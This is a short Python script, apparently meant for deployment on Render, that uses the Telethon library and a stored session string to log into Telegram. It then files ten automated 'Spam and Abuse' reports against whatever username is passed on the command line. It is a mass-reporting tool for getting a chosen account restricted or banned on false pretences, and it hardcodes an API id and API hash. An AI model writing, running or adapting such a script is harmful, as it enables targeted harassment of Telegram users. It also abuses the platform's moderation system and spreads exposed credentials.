import os, sys, time
from telethon import TelegramClient, types, functions
from telethon.sessions import StringSession

# Target lena
target = sys.argv[1] if len(sys.argv) > 1 else None

# Variable check karna (Dono names check karega)
string = os.environ.get("SESSION_1") or os.environ.get("SESSION_STRING")

if not target:
    print("Error: Target username missing!")
    sys.exit()

if not string:
    print(f"Error: Session String not found! Check Render Environment Variables.")
    sys.exit()

api_id = 27070308
api_hash = 'd1bfc4df9e7a49882cf91fc9f98fc8dd'

try:
    # StringSession ke saath connect karna
    client = TelegramClient(StringSession(string), api_id, api_hash)
    with client:
        print(f"Connecting... Target: {target}")
        entity = client.get_entity(target)
        
        # 10 Reports bhejna
        for i in range(10):
            client(functions.account.ReportPeerRequest(
                peer=entity,
                reason=types.InputReportReasonSpam(),
                message='Spam and Abuse'
            ))
            print(f"Report {i+1} sent!")
            time.sleep(1)
            
except Exception as e:
    print(f"FAILED: {e}")
			
